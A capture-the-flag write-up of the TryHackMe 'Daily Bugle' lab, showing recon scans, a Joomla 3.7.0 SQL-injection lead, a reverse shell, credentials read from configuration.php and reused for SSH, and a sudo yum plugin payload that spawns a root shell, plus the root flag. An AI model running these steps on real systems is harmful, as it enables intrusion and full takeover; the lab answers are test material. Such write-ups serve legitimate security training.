# [Daily Bugle](https://tryhackme.com/room/dailybugle)
> Darshan Patel

## Overview

| Tables | Description |
| ------ | ----------- |
| Challenge Name | Dailt Bugle |
| Difficulty | Hard |
| Tags | joomla, sqli, yum, sqlmap|

---

```bash
export IP=10.10.130.16
```
```
Edit the /etc/hosts file.
192.168.0.103   gateway.docker.internal
127.0.0.1       kubernetes.docker.internal
10.10.38.95    bugle.thm
```

Nmap scan results:
```
root@LAPTOP-U5913CMD:/home/akshay/Desktop/DailBugle# nmap -A -T4 bugle.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-20 14:35 IST
Stats: 0:00:48 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 14:36 (0:00:00 remaining)
Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 95.97% done; ETC: 14:36 (0:00:00 remaining)
Nmap scan report for bugle.thm (10.10.38.95)
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE   VERSION
22/tcp open  ssh       OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp open  ssl/http?
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/20%OT=22%CT=1%CU=31896%PV=Y%DS=2%DC=T%G=Y%TM=5FB787
OS:91%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%II=I%TS=A)SEQ(SP=
OS:105%GCD=1%ISR=109%TI=Z%TS=A)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT
OS:11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=6
OS:8DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q
OS:=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RU
OS:CK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

We know that the web server is running joomla.
We can make the use of joomscan tool to identify the version.
```
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.38.95/administrator/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable
^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A
[+] Checking Directory Listing
[++] directory has directory listing :
http://10.10.38.95/administrator/components
http://10.10.38.95/administrator/modules
http://10.10.38.95/administrator/templates
http://10.10.38.95/administrator/includes
http://10.10.38.95/administrator/language
http://10.10.38.95/administrator/templates


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page not found

[+] Checking robots.txt existing
[++] robots.txt is not found

[+] Finding common backup files name
[++] Backup files are not found                                                                                         
                                                                                                                        
[+] Finding common log files name                                                                                       
[++] error log is not found                                                                                             
                                                                                                                        
[+] Checking sensitive config.php.x file                                                                                
[++] Readable config files are not found                                                                                
                                                                                                                        
                                                                                                                        
Your Report : reports/10.10.38.95/
```

Using `Searchsploit` to find the exploit 
```
root@kali:/home/kali/Desktop/ctf/tryhackme/daily-bugle# searchsploit joomla 3.7.0
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                                                | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                                                             | php/webapps/43488.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Using the exploit, we can get the `username` and `password` for the login page
```
jonah:spiderman123
```

We are the superuser so we can upload a reverse shell to get access to the machine.

```
root@kali:/home/kali/Desktop/ctf/tryhackme/daily-bugle# nc -nvlp 1234
Listening on 0.0.0.0 1234
Connection received on 10.10.146.211 54482
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 05:25:02 up 21 min,  0 users,  load average: 1.05, 0.82, 0.53
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ id

sh-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}

bash-4.2$ su jjameson
su jjameson
Password: nv5uz9r3ZEDzVjNu

[jjameson@dailybugle html]$ id
id
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
```
once we obtain the credentials for `jjameson`, we can `ssh` into the machine using the same credentials
```
root@kali:/home/kali/Desktop/ctf/tryhackme/daily-bugle# ssh jjameson@10.10.146.211
jjameson@10.10.146.211's password:
Last login: Fri Nov 20 05:37:10 2020
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ clear
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR
    USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum

[jjameson@dailybugle ~]$ cd /tmp
[jjameson@dailybugle tmp]$ TF=$(mktemp -d)
[jjameson@dailybugle tmp]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle tmp]$
[jjameson@dailybugle tmp]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle tmp]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle tmp]$ sudo /usr/bin/yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# id
uid=0(root) gid=0(root) groups=0(root)
sh-4.2# cd /root
sh-4.2# ls -la
total 28
dr-xr-x---.  3 root root  163 Dec 15  2019 .
dr-xr-xr-x. 17 root root  244 Dec 14  2019 ..
-rw-------.  1 root root 1484 Dec 14  2019 anaconda-ks.cfg
lrwxrwxrwx   1 root root    9 Dec 14  2019 .bash_history -> /dev/null
-rw-r--r--.  1 root root   18 Dec 28  2013 .bash_logout
-rw-r--r--.  1 root root  176 Dec 28  2013 .bash_profile
-rw-r--r--.  1 root root  176 Dec 28  2013 .bashrc
-rw-r--r--.  1 root root  100 Dec 28  2013 .cshrc
drwxr-----.  3 root root   19 Dec 14  2019 .pki
-rw-r--r--   1 root root   33 Dec 15  2019 root.txt
-rw-r--r--.  1 root root  129 Dec 28  2013 .tcshrc
sh-4.2# cat root.txt
`eec3d53292b1821868266858d7fa6f79`

```
